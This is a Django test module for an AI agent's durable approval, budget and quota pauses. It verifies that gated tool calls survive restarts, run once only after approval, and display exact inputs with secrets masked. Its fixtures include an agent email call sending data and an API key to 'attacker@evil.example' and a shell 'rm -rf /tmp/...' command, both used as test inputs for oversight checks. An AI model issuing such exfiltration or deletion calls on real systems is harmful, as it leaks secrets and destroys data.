"""T-D4: durable pauses that survive a restart (P3-3).

Every test that matters here fails on ``main``: the pause lived in a cache
with a ten-minute TTL, so a fresh process could not resume it, and only the
first gated call was held.
"""
from __future__ import annotations

import asyncio
import json
from datetime import timedelta
from unittest.mock import AsyncMock, MagicMock, patch

from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.test import TransactionTestCase, override_settings
from django.utils import timezone

from chatbot.models import Chatroom
from orchestration import turns as turns_mod
from orchestration.agent_loop import (
    _append_terminal_results,
    _args_hash,
    _quota_pause_ttl,
    resume_after_confirmation,
    resume_after_expiry,
    resume_after_quota,
    resume_with_more_budget,
    run_agent_loop,
    save_pending_confirmation,
)
from orchestration.models import Turn
from workflows.models import WorkflowApprovalRecord


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


async def _collect(gen):
    return [event async for event in gen]


def _response(blocks, stop_reason="end_turn", usage=None):
    return {
        "content": blocks,
        "stop_reason": stop_reason,
        "usage": usage or {"input_tokens": 10, "output_tokens": 5},
    }


def _text(text):
    return {"type": "text", "text": text}


def _tool(call_id, name, tool_input):
    return {"type": "tool_use", "id": call_id, "name": name, "input": tool_input}


def _assert_history_paired(messages):
    """Every tool_use is answered by the very next user message, in order.

    No text block may precede the results, and two user messages may not be
    adjacent: that is the shape Anthropic accepts and the one the paused step
    must emit.
    """
    for index, message in enumerate(messages):
        content = message.get("content")
        if message.get("role") != "assistant" or not isinstance(content, list):
            continue
        tool_ids = [
            block.get("id") for block in content
            if isinstance(block, dict) and block.get("type") == "tool_use"
        ]
        if not tool_ids:
            continue
        if index + 1 >= len(messages):
            raise AssertionError(f"tool_use left unpaired: {tool_ids}")
        answer = messages[index + 1]
        if answer.get("role") != "user" or not isinstance(answer.get("content"), list):
            raise AssertionError(f"tool_use not answered by a user message: {tool_ids}")
        result_ids = []
        saw_text = False
        for block in answer["content"]:
            if not isinstance(block, dict):
                continue
            if block.get("type") == "tool_result":
                if saw_text:
                    raise AssertionError("text block appears before a tool_result")
                result_ids.append(block.get("tool_use_id"))
            elif block.get("type") == "text":
                saw_text = True
        if result_ids != tool_ids:
            raise AssertionError(
                f"results {result_ids} do not answer tools {tool_ids} in order"
            )
    for first, second in zip(messages, messages[1:]):
        if first.get("role") == second.get("role") == "user":
            raise AssertionError("two user messages are adjacent")


def _rich_calls():
    body = "B" * 300
    items = [f"item-{index:02d}" for index in range(20)]
    command = "rm -rf /tmp/" + ("a" * 180)
    return {
        "email": {
            "id": "c1",
            "name": "send_email",
            "input": {
                "to": "attacker@evil.example",
                "subject": "Quarterly report",
                "body": body,
                "attachments": items,
                "api_key": "sk-live-supersecret-0123456789",
            },
        },
        "shell": {
            "id": "c2",
            "name": "run_command",
            "input": {"command": command},
        },
        "body": body,
        "items": items,
        "command": command,
    }


class _PauseHarness(TransactionTestCase):
    def setUp(self):
        super().setUp()
        cache.clear()
        User = get_user_model()
        self.user = User.objects.create_user(username="pauseuser", password="pw")  # nosec B106
        self.room = Chatroom.objects.create()

        self.persona = patch(
            "orchestration.agent_loop._resolve_persona",
            new=AsyncMock(return_value=None),
        )
        self.persona.start()
        self.addCleanup(self.persona.stop)
        self.patches = [
            patch("orchestration.agent_loop.enforce_agent_caps", return_value=True),
            patch("orchestration.agent_loop._search_backend_available", return_value=False),
            patch("orchestration.agent_loop.get_llm_client"),
            patch("orchestration.agent_loop.execute_tool", new_callable=AsyncMock),
            patch("orchestration.agent_loop.preview_tool", new_callable=AsyncMock),
        ]
        started = [p.start() for p in self.patches]
        self.addCleanup(lambda: [p.stop() for p in self.patches])
        self.llm_client = started[2]
        self.execute_tool = started[3]
        self.preview_tool = started[4]
        self.preview_tool.return_value = None
        self.execute_tool.return_value = {"status": "success", "data": {"ok": True}}

    def _turn(self):
        return Turn.objects.create(
            room=self.room,
            user=self.user,
            state="running",
            version=0,
            started_at=timezone.now(),
            attempt=1,
        )

    def _llm(self, responses):
        llm = MagicMock()
        llm.default_provider = MagicMock(return_value="deepseek")
        llm.create_message = AsyncMock(side_effect=responses)
        self.llm_client.return_value = llm
        return llm

    def _context(self, turn):
        return {
            "user_id": self.user.id,
            "room_id": self.room.id,
            "username": self.user.username,
            "turn_id": str(turn.pk),
            # These tests own a live turn; the real coordinator passes this
            # hook, and a Turn context without one fails closed (#216b-1).
            "turn_live": lambda: True,
        }

    def _pause(self, turn, calls, *, kind="approval", state=None, budget=None):
        payload = dict(state or {})
        if calls:
            payload.setdefault("messages", [
                {"role": "assistant", "content": [
                    _tool(c["id"], c["name"], c["input"]) for c in calls
                ]},
            ])
            payload.setdefault("pending_tools", calls)
            payload.setdefault("pending_tiers", [None for _ in calls])
            payload.setdefault("pending_tool", calls[0])
            payload.setdefault("pending_tier", None)
            payload.setdefault(
                "pending_args_hashes",
                {c["id"]: _args_hash(c["input"]) for c in calls},
            )
            payload.setdefault("paused_for_confirmation", True)
        payload.setdefault("active_seconds", 0.0)
        payload.setdefault("wall_started_at", timezone.now().timestamp())
        return turns_mod.pause_turn(
            str(turn.pk), turn.version,
            state_payload=payload, pause_kind=kind,
            tainted=bool(payload.get("tainted")),
            budget=budget,
        )


class RestartApprovalTests(_PauseHarness):
    def test_restart_mid_approval_runs_the_stored_action_once(self):
        turn = self._turn()
        call = {"id": "call-1", "name": "send_email", "input": {"to": "a@b.c", "body": "hi"}}
        self._llm([
            _response([_tool("call-1", "send_email", call["input"])], stop_reason="tool_use"),
            _response([_text("Sent.")]),
        ])

        events = _run(_collect(run_agent_loop(
            user_message="send it",
            context=self._context(turn),
            preferences={},
        )))
        self.assertTrue(any(e.kind == "confirmation" for e in events))
        turn.refresh_from_db()
        self.assertEqual(turn.state, "paused")
        self.assertEqual(turn.pause_kind, "approval")
        self.assertIsNotNone(turn.paused_state_enc)
        self.assertNotIn("a@b.c", turn.paused_state_enc)

        # A fresh process: the cache is empty, but the Turn is not.
        cache.clear()
        resumed = _run(_collect(resume_after_confirmation(
            context=self._context(turn),
            preferences={},
        )))

        self.assertEqual(self.execute_tool.await_count, 1)
        self.assertEqual(self.execute_tool.await_args.args[0], "send_email")
        self.assertEqual(self.execute_tool.await_args.args[1], call["input"])
        self.assertTrue(any(e.kind == "done" for e in resumed))
        self.assertEqual(
            WorkflowApprovalRecord.objects.get(kind="agent_loop").status, "approved",
        )

    def test_the_same_approval_can_never_run_twice(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._llm([
            _response([_tool("c1", "send_email", call["input"])], stop_reason="tool_use"),
            _response([_text("Sent.")]),
        ])
        _run(_collect(run_agent_loop(
            user_message="send it", context=self._context(turn), preferences={},
        )))
        cache.clear()

        first = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        second = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        self.assertEqual(self.execute_tool.await_count, 1)
        self.assertTrue(any(e.kind == "done" for e in first))
        self.assertTrue(any(e.kind == "error" for e in second))


class HeldBatchTests(_PauseHarness):
    def test_two_gated_calls_are_held_and_run_together(self):
        turn = self._turn()
        first = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        second = {"id": "c2", "name": "send_email", "input": {"to": "d@e.f"}}
        llm = self._llm([
            _response([
                _tool("c1", "send_email", first["input"]),
                _tool("c2", "send_email", second["input"]),
            ], stop_reason="tool_use"),
            _response([_text("Both sent.")]),
        ])

        events = _run(_collect(run_agent_loop(
            user_message="send both",
            context=self._context(turn),
            preferences={},
        )))
        confirmation = next(e for e in events if e.kind == "confirmation")
        self.assertIn("2 actions", confirmation.data["message"])
        self.assertNotIn("Skipped:", confirmation.data["message"])
        self.assertEqual(len(confirmation.data["calls"]), 2)

        record = WorkflowApprovalRecord.objects.get(kind="agent_loop")
        self.assertEqual(len(record.metadata["calls"]), 2)
        self.assertEqual(
            [entry["tool"] for entry in record.metadata["calls"]],
            ["send_email", "send_email"],
        )
        self.assertNotIn("args_hash", record.metadata["calls"][0])
        display_calls = record.sanitized_params["calls"]
        self.assertEqual(len(display_calls), 2)
        self.assertEqual(
            [entry["params"]["to"] for entry in display_calls],
            ["[REDACTED EMAIL]", "[REDACTED EMAIL]"],
        )
        self.assertNotIn("a@b.c", record.approval_message)

        cache.clear()
        turn.refresh_from_db()
        resumed = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        self.assertEqual(self.execute_tool.await_count, 2)
        self.assertEqual(
            [c.args[1]["to"] for c in self.execute_tool.await_args_list],
            ["a@b.c", "d@e.f"],
        )
        done = next(e for e in resumed if e.kind == "done")
        self.assertEqual(done.data["end_reason"], "finished")
        messages = llm.create_message.await_args_list[-1].kwargs["messages"]
        _assert_history_paired(messages)

    def test_tainted_pause_resumes_tainted_after_room_key_is_gone(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call], state={"tainted": True})
        _run(save_pending_confirmation(
            self.room.id, self.user.id, call, "Send?",
            turn_id=turn.pk, calls=[call],
        ))
        cache.delete("agent_loop_taint:{}".format(self.room.id))
        turn.refresh_from_db()
        state = _run(turns_mod.aget_turn_paused_state(turn))
        self.assertIsNotNone(state)
        self.assertTrue(state["tainted"])
        self._llm([_response([_text("Sent.")])])

        _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))

        self.assertEqual(self.execute_tool.await_count, 1)
        turn.refresh_from_db()
        self.assertTrue(turn.tainted)

    def test_reproposed_arguments_do_not_run_without_a_new_approval(self):
        turn = self._turn()
        shown = {"id": "c1", "name": "send_email", "input": {"to": "safe@b.c"}}
        other = {"id": "c1", "name": "send_email", "input": {"to": "evil@b.c"}}
        _run(save_pending_confirmation(
            self.room.id, self.user.id, shown, "Send?",
            turn_id=turn.pk, calls=[shown],
        ))
        # The stored state tries to run different arguments while carrying the
        # hashes of what was actually shown.
        self._pause(turn, [other], state={
            "pending_args_hashes": {"c1": _args_hash(shown["input"])},
        })
        cache.clear()

        events = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        self.assertEqual(self.execute_tool.await_count, 0)
        self.assertTrue(any(e.kind == "error" for e in events))


class ApprovalPromptShowsExactInputTests(_PauseHarness):
    @override_settings(SHELL_EXEC_PROFILE="standard")
    def test_the_prompt_shows_every_raw_value_and_names_restricted_keys(self):
        rich = _rich_calls()
        calls = [rich["email"], rich["shell"]]
        turn = self._turn()
        self._llm([
            _response(
                [
                    _tool(call["id"], call["name"], call["input"])
                    for call in calls
                ],
                stop_reason="tool_use",
            ),
        ])

        events = _run(_collect(run_agent_loop(
            user_message="send it", context=self._context(turn), preferences={},
        )))

        confirmation = next(e for e in events if e.kind == "confirmation")
        message = confirmation.data["message"]
        self.assertIn(rich["email"]["input"]["to"], message)
        self.assertIn(rich["body"], message)
        for item in rich["items"]:
            self.assertIn(item, message)
        self.assertIn(rich["command"], message)
        self.assertIn("api_key", message)
        self.assertIn("[secret value, not sent]", message)
        self.assertNotIn("sk-live-supersecret-0123456789", message)

        # The plaintext row keeps the masked display, never the raw input.
        record = WorkflowApprovalRecord.objects.get(kind="agent_loop")
        blob = json.dumps({
            "message": record.approval_message,
            "params": record.sanitized_params,
            "metadata": record.metadata,
        })
        self.assertNotIn(rich["email"]["input"]["to"], blob)
        self.assertNotIn(rich["body"], blob)
        self.assertNotIn(rich["command"], blob)
        self.assertNotIn("sk-live-supersecret-0123456789", blob)
        self.assertNotIn("api_key", record.sanitized_params["calls"][0]["params"])


class BudgetAndQuotaRestartTests(_PauseHarness):
    @override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000)
    def test_budget_pause_survives_a_restart(self):
        turn = self._turn()
        self._llm([
            _response(
                [_tool("w1", "get_weather", {"city": "Nairobi"})],
                stop_reason="tool_use",
                usage={"input_tokens": 50, "output_tokens": 50},
            ),
            _response([_text("Finished.")]),
        ])
        events = _run(_collect(run_agent_loop(
            user_message="long task", context=self._context(turn), preferences={},
        )))
        self.assertTrue(any(e.kind == "paused" for e in events))
        turn.refresh_from_db()
        self.assertEqual((turn.state, turn.pause_kind), ("paused", "budget"))

        cache.clear()
        resumed = _run(_collect(resume_with_more_budget(
            context=self._context(turn), preferences={},
        )))
        done = next(e for e in resumed if e.kind == "done")
        self.assertEqual(done.data["end_reason"], "finished")

    def test_quota_pause_survives_a_restart(self):
        from orchestration.llm_client import TokenQuotaExceeded

        turn = self._turn()
        llm = self._llm([
            TokenQuotaExceeded(1800, reason="limit"),
            _response([_text("Finished.")]),
        ])
        events = _run(_collect(run_agent_loop(
            user_message="long task", context=self._context(turn), preferences={},
        )))
        self.assertTrue(any(e.kind == "paused" for e in events))
        turn.refresh_from_db()
        self.assertEqual((turn.state, turn.pause_kind), ("paused", "quota"))

        cache.clear()
        resumed = _run(_collect(resume_after_quota(
            context=self._context(turn), preferences={},
        )))
        self.assertTrue(any(e.kind == "done" for e in resumed))
        self.assertGreaterEqual(llm.create_message.await_count, 2)


class ExpiryAndTimeTests(_PauseHarness):
    def test_late_yes_after_expiry_carries_an_is_error_result(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call])
        turn.refresh_from_db()
        turns_mod.transition(
            str(turn.pk), turn.version, "expired",
            from_state="paused", end_reason="pause_expired",
        )
        Turn.objects.filter(pk=turn.pk).update(
            pause_expires_at=timezone.now() - timedelta(minutes=1),
        )
        llm = self._llm([_response([_text("It expired.")])])

        events = _run(_collect(resume_after_expiry(
            context=self._context(turn), preferences={},
        )))
        self.assertTrue(any(
            e.kind == "harness" and "expired" in e.data.get("text", "").lower()
            for e in events
        ))
        messages = llm.create_message.await_args.kwargs["messages"]
        self.assertTrue(any(
            block.get("is_error") is True
            for message in messages if isinstance(message.get("content"), list)
            for block in message["content"] if isinstance(block, dict)
        ))
        _assert_history_paired(messages)
        self.assertEqual(self.execute_tool.await_count, 0)

    def test_elapsed_spans_the_pause_and_the_backstop_uses_active_time(self):
        turn = self._turn()
        state = {
            "messages": [{"role": "user", "content": "keep going"}],
            "awaiting_budget": True,
            "token_budget": 50000,  # nosec B105 — test fixture, not a credential
            "tokens_used": 10,
            "active_seconds": 5.0,
            "wall_started_at": timezone.now().timestamp() - 3600,
        }
        self.assertTrue(self._pause(turn, [], kind="budget", state=state))
        self._llm([_response([_text("Finished.")])])

        # The module constant is what the loop reads, so an override_settings
        # entry here would have no effect.
        with patch("orchestration.agent_loop.HARD_TURN_TIMEOUT_SECONDS", 60):
            events = _run(_collect(resume_with_more_budget(
                context=self._context(turn), preferences={},
            )))
        done = next(e for e in events if e.kind == "done")
        self.assertGreaterEqual(done.data["elapsed"], 3500)
        self.assertFalse(any(
            e.kind == "error" and "ran out of time" in e.data.get("message", "")
            for e in events
        ))


class ExpiredBudgetQuotaHistoryTests(_PauseHarness):
    def _expire(self, turn):
        turn.refresh_from_db()
        turns_mod.transition(
            str(turn.pk), turn.version, "expired",
            from_state="paused", end_reason="pause_expired",
        )
        Turn.objects.filter(pk=turn.pk).update(
            pause_expires_at=timezone.now() - timedelta(minutes=1),
        )

    def _answered_step(self):
        return [
            {"role": "user", "content": "what is the weather?"},
            {"role": "assistant", "content": [
                _tool("c1", "get_weather", {"city": "Nairobi"}),
            ]},
            {"role": "user", "content": [{
                "type": "tool_result",
                "tool_use_id": "c1",
                "content": '{"status": "success"}',
            }]},
        ]

    def _results_for(self, messages, call_id):
        return [
            block.get("tool_use_id")
            for message in messages
            if isinstance(message.get("content"), list)
            for block in message["content"]
            if isinstance(block, dict) and block.get("type") == "tool_result"
            and block.get("tool_use_id") == call_id
        ]

    def test_an_expired_quota_pause_does_not_duplicate_an_answered_step(self):
        turn = self._turn()
        state = {
            "messages": self._answered_step(),
            "awaiting_budget": True,
            "awaiting_quota": True,
            "end_reason": "quota",
            "token_budget": 50000,  # nosec B105 — test fixture, not a credential
            "tokens_used": 10,
            "active_seconds": 0.0,
        }
        self.assertTrue(self._pause(turn, [], kind="quota", state=state))
        self._expire(turn)
        llm = self._llm([_response([_text("The hourly limit freed; nothing ran.")])])

        events = _run(_collect(resume_after_expiry(
            context=self._context(turn), preferences={},
        )))

        messages = llm.create_message.await_args.kwargs["messages"]
        _assert_history_paired(messages)
        self.assertEqual(self._results_for(messages, "c1"), ["c1"])
        self.assertFalse(any(e.kind == "paused" for e in events))

    def test_an_expired_budget_pause_answers_instead_of_repausing(self):
        turn = self._turn()
        state = {
            "messages": self._answered_step(),
            "awaiting_budget": True,
            "end_reason": "asked_for_more",
            "token_budget": 10,  # nosec B105 — test fixture, not a credential
            "tokens_used": 10,
            "active_seconds": 0.0,
        }
        self.assertTrue(self._pause(turn, [], kind="budget", state=state))
        self._expire(turn)
        llm = self._llm([_response([_text("It expired before I replied.")])])

        events = _run(_collect(resume_after_expiry(
            context=self._context(turn), preferences={},
        )))

        messages = llm.create_message.await_args.kwargs["messages"]
        _assert_history_paired(messages)
        self.assertEqual(self._results_for(messages, "c1"), ["c1"])
        self.assertEqual(llm.create_message.await_count, 1)
        self.assertTrue(any(e.kind == "done" for e in events))
        self.assertFalse(any(e.kind == "paused" for e in events))


class CoordinatorRestartTests(_PauseHarness):
    def _coordinator(self, *, extra_patches=None):
        from asgiref.sync import async_to_sync
        from contextlib import ExitStack
        from orchestration.coordinator import OrchestrationCoordinator

        sent = []

        async def _send(*args, **kwargs):
            if len(args) >= 2:
                sent.append(args[1])
            return None

        async def _send_step(*args, **kwargs):
            return None

        async def _run(query):
            return await OrchestrationCoordinator().handle_message(
                query=query,
                user_id=self.user.id,
                room_id=self.room.id,
                username=self.user.username,
                message_id=None,
                send_chunk=_send,
                send_step_event=_send_step,
                get_context_prompt=AsyncMock(return_value=""),
                bump_signals=MagicMock(),
                history_messages=None,
            )

        patches = {
            "orchestration.coordinator.load_memory_summary": AsyncMock(return_value=None),
            "orchestration.coordinator.get_user_preferences": lambda user_id, profile_obj=None: {},
            "orchestration.coordinator.cache": MagicMock(),
            "orchestration.coordinator.record_event": MagicMock(),
            "orchestration.coordinator._quota_resume_still_blocked": AsyncMock(return_value=None),
        }
        patches.update(extra_patches or {})

        def run(query):
            with ExitStack() as stack:
                for target, new in patches.items():
                    stack.enter_context(patch(target, new))
                result = async_to_sync(_run)(query)
                # The consumer finalizes a committing Turn after saving the
                # reply; without it the next resume would hit the active-Turn
                # unique constraint.
                async_to_sync(OrchestrationCoordinator().finalize_turn)(
                    result, reply_saved=True,
                )
                return result

        run.sent = sent
        return run

    def test_a_fresh_coordinator_resumes_the_paused_action_on_yes(self):
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._llm([
            _response([_tool("c1", "send_email", call["input"])], stop_reason="tool_use"),
            _response([_text("Sent.")]),
        ])

        run = self._coordinator()
        run("send it")
        turn = Turn.objects.get()
        self.assertEqual((turn.state, turn.pause_kind), ("paused", "approval"))

        # Restart: no cache, a brand-new coordinator, the same durable Turn.
        cache.clear()
        run("yes")

        self.assertEqual(self.execute_tool.await_count, 1)
        self.assertEqual(self.execute_tool.await_args.args[1], call["input"])
        self.assertEqual(
            WorkflowApprovalRecord.objects.get(kind="agent_loop").status, "approved",
        )

    def test_a_question_reshows_the_prompt_and_the_next_yes_runs_the_action(self):
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._llm([
            _response([_tool("c1", "send_email", call["input"])], stop_reason="tool_use"),
            _response([_text("It sends the report.")]),
            _response([_text("Sent.")]),
        ])
        run = self._coordinator()
        run("send it")
        run.sent.clear()

        run("what does that do?")
        question_output = "".join(run.sent)
        self.assertIn("Should I go ahead", question_output)
        self.assertNotIn("did not run the pending action", question_output)
        self.assertNotIn("\\n\\n", question_output)
        self.assertEqual(question_output.count("approval id"), 1)
        self.assertEqual(self.execute_tool.await_count, 0)

        run("yes")
        self.assertEqual(self.execute_tool.await_count, 1)
        self.assertEqual(self.execute_tool.await_args.args[1], call["input"])

    @override_settings(SHELL_EXEC_PROFILE="standard")
    def test_a_question_reshows_the_exact_input_not_the_masked_row(self):
        rich = _rich_calls()
        calls = [rich["email"], rich["shell"]]
        self._llm([
            _response(
                [
                    _tool(call["id"], call["name"], call["input"])
                    for call in calls
                ],
                stop_reason="tool_use",
            ),
            _response([_text("It sends the report and cleans up.")]),
        ])
        run = self._coordinator()
        run("send it")
        run.sent.clear()

        run("what does that do?")

        question_output = "".join(run.sent)
        self.assertIn("Should I go ahead", question_output)
        self.assertIn(rich["email"]["input"]["to"], question_output)
        self.assertIn(rich["body"], question_output)
        for item in rich["items"]:
            self.assertIn(item, question_output)
        self.assertIn(rich["command"], question_output)
        self.assertIn("api_key", question_output)
        self.assertIn("[secret value, not sent]", question_output)
        self.assertEqual(self.execute_tool.await_count, 0)

    @override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000)
    def test_a_question_that_runs_out_of_budget_names_the_dropped_action_first(self):
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._llm([
            _response(
                [_tool("c1", "send_email", call["input"])],
                stop_reason="tool_use",
                usage={"input_tokens": 1, "output_tokens": 1},
            ),
            _response(
                [_tool("w1", "get_weather", {"city": "Nairobi"})],
                stop_reason="tool_use",
                usage={"input_tokens": 50, "output_tokens": 50},
            ),
            _response([_text("Continuing from where it stopped.")]),
        ])
        run = self._coordinator()
        run("send it")
        run.sent.clear()

        question_result = run("what does that do?")

        question_output = "".join(run.sent)
        self.assertIn("send email", question_output)
        self.assertIn("not run", question_output)
        self.assertIn("dropped", question_output)
        self.assertIn("more budget", question_output)
        self.assertIn("dropped", question_result.harness)
        self.assertNotIn("dropped", question_result.model_text)
        self.assertLess(
            question_output.index("send email"),
            question_output.index("more budget"),
        )
        executed = [c.args[0] for c in self.execute_tool.await_args_list]
        self.assertEqual(executed, ["get_weather"])

        run.sent.clear()
        run("yes")

        self.assertIn("Continuing with more budget", "".join(run.sent))
        self.assertEqual(
            [c.args[0] for c in self.execute_tool.await_args_list],
            ["get_weather"],
        )

    def test_autopilot_never_confirms_a_batch_that_holds_a_non_shell_call(self):
        safe = {"id": "a1", "name": "get_weather", "input": {"city": "Nairobi"}}
        gated = {"id": "g1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._llm([
            _response([
                _tool("a1", "get_weather", safe["input"]),
                _tool("g1", "send_email", gated["input"]),
            ], stop_reason="tool_use"),
        ])
        run = self._coordinator(extra_patches={
            "orchestration.shell.autopilot.arm": MagicMock(return_value=True),
        })
        run("send it")
        run.sent.clear()

        run("autopilot")

        self.assertEqual(self.execute_tool.await_count, 1)  # only the safe call
        turn = Turn.objects.get(state="paused")
        self.assertEqual((turn.state, turn.pause_kind), ("paused", "approval"))
        self.assertIn("Should I go ahead", "".join(run.sent))

    def test_a_late_yes_after_expiry_is_answered_before_a_new_turn_exists(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call])
        turn.refresh_from_db()
        turns_mod.transition(
            str(turn.pk), turn.version, "expired",
            from_state="paused", end_reason="pause_expired",
        )
        Turn.objects.filter(pk=turn.pk).update(
            pause_expires_at=timezone.now() - timedelta(minutes=1),
        )
        llm = self._llm([_response([_text("It expired.")])])
        run = self._coordinator()
        run.sent.clear()

        result = run("yes")

        sent = "".join(run.sent)
        self.assertIn("approval expired at", sent)
        self.assertIn("approval expired at", result.harness)
        self.assertEqual(result.model_text, "It expired.")
        self.assertEqual(self.execute_tool.await_count, 0)
        messages = llm.create_message.await_args.kwargs["messages"]
        _assert_history_paired(messages)
        self.assertTrue(any(
            block.get("is_error") is True
            for message in messages if isinstance(message.get("content"), list)
            for block in message["content"] if isinstance(block, dict)
        ))

    def test_late_no_or_cancel_after_expiry_never_restarts_the_task(self):
        for kind in ("approval", "budget", "quota"):
            for reply in ("no", "cancel"):
                with self.subTest(kind=kind, reply=reply):
                    # A fresh room keeps each expired pause the newest for its
                    # own case, exactly like the live routing check.
                    self.room = Chatroom.objects.create()
                    turn = self._turn()
                    if kind == "approval":
                        call = {
                            "id": "c1", "name": "send_email",
                            "input": {"to": "a@b.c"},
                        }
                        self._pause(turn, [call], kind="approval")
                    elif kind == "budget":
                        self._pause(turn, [], kind="budget", state={
                            "messages": [
                                {"role": "user", "content": "keep going"},
                            ],
                            "awaiting_budget": True,
                            "end_reason": "asked_for_more",
                            "token_budget": 10,  # nosec B105 — test fixture, not a credential
                            "tokens_used": 10,
                            "active_seconds": 0.0,
                        })
                    else:
                        self._pause(turn, [], kind="quota", state={
                            "messages": [
                                {"role": "user", "content": "keep going"},
                            ],
                            "awaiting_budget": True,
                            "awaiting_quota": True,
                            "end_reason": "quota",
                            "token_budget": 10,  # nosec B105 — test fixture, not a credential
                            "tokens_used": 10,
                            "active_seconds": 0.0,
                        })
                    turn.refresh_from_db()
                    turns_mod.transition(
                        str(turn.pk), turn.version, "expired",
                        from_state="paused", end_reason="pause_expired",
                    )
                    Turn.objects.filter(pk=turn.pk).update(
                        pause_expires_at=timezone.now() - timedelta(minutes=1),
                    )
                    llm = self._llm([_response([_text("must not run")])])
                    self.execute_tool.reset_mock()
                    run = self._coordinator()
                    run.sent.clear()

                    result = run(reply)

                    sent = "".join(run.sent)
                    self.assertIn("expired at", sent)
                    self.assertIn("nothing ran", sent)
                    self.assertIn("nothing ran", result.harness)
                    self.assertEqual(result.model_text, "")
                    self.assertEqual(llm.create_message.await_count, 0)
                    self.assertEqual(self.execute_tool.await_count, 0)
                    ended = Turn.objects.filter(room=self.room).order_by(
                        "-created_at",
                    ).first()
                    self.assertEqual(
                        (ended.state, ended.end_reason), ("completed", "finished"),
                    )


class MixedStepTests(_PauseHarness):
    def _mixed_pause(self):
        turn = self._turn()
        safe = {"id": "a1", "name": "get_weather", "input": {"city": "Nairobi"}}
        gated = {"id": "g1", "name": "send_email", "input": {"to": "a@b.c"}}
        llm = self._llm([
            _response([
                _tool("a1", "get_weather", safe["input"]),
                _tool("g1", "send_email", gated["input"]),
            ], stop_reason="tool_use"),
            _response([_text("Sent.")]),
        ])
        events = _run(_collect(run_agent_loop(
            user_message="send it", context=self._context(turn), preferences={},
        )))
        self.assertTrue(any(e.kind == "confirmation" for e in events))
        self.assertEqual(self.execute_tool.await_count, 1)  # the safe call
        turn.refresh_from_db()
        return turn, gated, llm

    def test_mixed_step_resume_emits_one_user_message_in_model_order(self):
        turn, gated, llm = self._mixed_pause()
        cache.clear()
        _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        self.assertEqual(self.execute_tool.await_count, 2)
        self.assertEqual(self.execute_tool.await_args.args[1], gated["input"])
        messages = llm.create_message.await_args_list[-1].kwargs["messages"]
        _assert_history_paired(messages)
        answer = next(
            message["content"] for message in messages
            if message.get("role") == "user"
            and isinstance(message.get("content"), list)
            and any(b.get("type") == "tool_result" for b in message["content"])
        )
        results = [b for b in answer if b.get("type") == "tool_result"]
        self.assertEqual([b["tool_use_id"] for b in results], ["a1", "g1"])

    def test_mixed_step_decline_emits_one_user_message_in_model_order(self):
        from orchestration.agent_loop import LoopState

        safe = {"id": "a1", "name": "get_weather", "input": {"city": "Nairobi"}}
        gated = {"id": "g1", "name": "send_email", "input": {"to": "a@b.c"}}
        state = LoopState(
            messages=[{"role": "assistant", "content": [
                _tool("a1", "get_weather", safe["input"]),
                _tool("g1", "send_email", gated["input"]),
            ]}],
            pending_tools=[gated],
            pending_tiers=[None],
            pending_tool=gated,
            pending_step_results=[{
                "type": "tool_result",
                "tool_use_id": "a1",
                "content": '{"status": "success"}',
            }],
        )
        _append_terminal_results(state, "you declined")
        _assert_history_paired(state.messages)
        answer = state.messages[-1]["content"]
        self.assertEqual(
            [b["tool_use_id"] for b in answer if b.get("type") == "tool_result"],
            ["a1", "g1"],
        )

    def test_mixed_step_expiry_emits_one_user_message_in_model_order(self):
        turn, _gated, llm = self._mixed_pause()
        turn.refresh_from_db()
        turns_mod.transition(
            str(turn.pk), turn.version, "expired",
            from_state="paused", end_reason="pause_expired",
        )
        Turn.objects.filter(pk=turn.pk).update(
            pause_expires_at=timezone.now() - timedelta(minutes=1),
        )
        llm.create_message = AsyncMock(side_effect=[_response([_text("It expired.")])])
        _run(_collect(resume_after_expiry(
            context=self._context(turn), preferences={},
        )))
        messages = llm.create_message.await_args.kwargs["messages"]
        _assert_history_paired(messages)
        answer = next(
            message["content"] for message in messages
            if message.get("role") == "user"
            and isinstance(message.get("content"), list)
            and any(b.get("type") == "tool_result" for b in message["content"])
        )
        results = [b for b in answer if b.get("type") == "tool_result"]
        self.assertEqual([b["tool_use_id"] for b in results], ["a1", "g1"])
        turn.refresh_from_db()
        self.assertIsNone(turn.paused_state_enc)


class MissingApprovalTests(_PauseHarness):
    def test_a_paused_turn_with_no_approval_row_never_runs_on_yes(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call])
        cache.clear()

        events = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))

        self.assertEqual(self.execute_tool.await_count, 0)
        self.assertTrue(any(e.kind == "error" for e in events))
        turn.refresh_from_db()
        self.assertEqual(turn.state, "failed")

    def test_a_row_write_failure_fails_the_pause_closed(self):
        turn = self._turn()
        self._llm([
            _response(
                [_tool("c1", "send_email", {"to": "a@b.c"})],
                stop_reason="tool_use",
            ),
        ])
        with patch(
            "orchestration.agent_loop.save_pending_confirmation",
            new=AsyncMock(side_effect=RuntimeError("db down")),
        ):
            events = _run(_collect(run_agent_loop(
                user_message="send it", context=self._context(turn), preferences={},
            )))

